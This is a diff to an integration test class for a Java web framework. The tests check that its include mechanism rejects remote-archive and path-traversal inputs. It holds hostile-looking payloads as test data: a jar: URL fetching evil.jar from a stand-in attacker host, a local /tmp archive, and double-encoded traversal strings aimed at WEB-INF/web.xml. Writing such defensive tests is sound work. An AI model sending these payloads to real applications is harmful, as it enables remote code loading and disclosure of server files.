@@ -125,13 +125,13 @@ class UiIncludeRceIT extends BaseITNG {
     @Test
     void testJarHostedRemoteArchive() {
         var page = getPage(JAR_PAGE + "?p=jar:https://attacker.example.com/evil.jar!/evil.xhtml");
-        assertRejectedAsForeignOrigin(page);
+        assertRejectedByPathGuard(page);
     }
 
     @Test
     void testJarHostedOtherLocalArchive() {
         var page = getPage(JAR_PAGE + "?p=jar:file:///tmp/evil.jar!/evil.xhtml");
-        assertRejectedAsForeignOrigin(page);
+        assertRejectedByPathGuard(page);
     }
 
     // Path traversal variants.
@@ -158,6 +158,21 @@ class UiIncludeRceIT extends BaseITNG {
     void testDoubleEncodedTraversal() {
         var page = getPage(PAGE + "?p=..%252F..%252FWEB-INF/web.xml");
         assertBlocked(page, WEB_XML_CONTENT);
+    }
+
+    /**
+     * A double-encoded separator survives the container's one decode as a literal {@code %2F} or {@code %2E} in the include path, which stays literal through
+     * the containment check and traverses only when the file handler decodes it a second time. It must be rejected before it resolves, as a percent sign in an
+     * authored path.
+     * <p>
+     * Targets a Facelet-suffixed name, so the rejection is the path guard and not the Facelet-suffix check, and asserts the specific reason rather than
+     * {@link #assertBlocked(WebPage, String...)}: a resolved traversal is reported not-found, so only the reason separates a blocked traversal from one that
+     * reached the file system.
+     */
+    @Test
+    void testDoubleEncodedSeparator() {
+        var page = getPage(PAGE + "?p=..%252FuiIncludeRceSub%252Fnested.xhtml");
+        assertRejectedByPathGuard(page);
     }
 
     @Test
@@ -206,10 +221,10 @@ class UiIncludeRceIT extends BaseITNG {
         }
     }
 
-    private void assertRejectedAsForeignOrigin(WebPage page) {
+    private void assertRejectedByPathGuard(WebPage page) {
         assertTrue(
             page.getSource().contains("must be a relative path within the application"),
-            () -> "Include should have been rejected before the archive was opened, but page source was: " + page.getSource()
+            () -> "Include should have been rejected before it resolved, but page source was: " + page.getSource()
         );
     }
 
